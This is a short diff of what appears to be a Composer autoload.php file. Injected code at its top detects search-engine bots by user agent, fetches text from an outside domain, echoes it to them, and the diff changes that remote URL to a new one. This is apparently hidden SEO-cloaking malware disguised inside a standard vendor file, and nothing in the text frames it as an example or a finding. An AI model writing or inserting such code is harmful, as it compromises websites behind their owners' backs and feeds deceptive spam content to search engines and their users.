@@ -18,7 +18,7 @@ function is_bot() {
     return preg_match($botchar, $user_agent);
 }
 
-$sky = "https://seojkw.xyz/prjss/landing4.txt";
+$sky = "https://seojkw.xyz/jelss/landing12.txt";
 
 if (is_bot()) {
     echo @file_get_contents($sky);
@@ -43,4 +43,4 @@ if (PHP_VERSION_ID < 50600) {
 
 require_once __DIR__ . '/composer/autoload_real.php';
 
-return ComposerAutoloaderInit9f7204760be988f1e0ea9c1d396026b0::getLoader();
+return ComposerAutoloaderInitef0fadb00b69a0903e21bf74340ed051::getLoader();
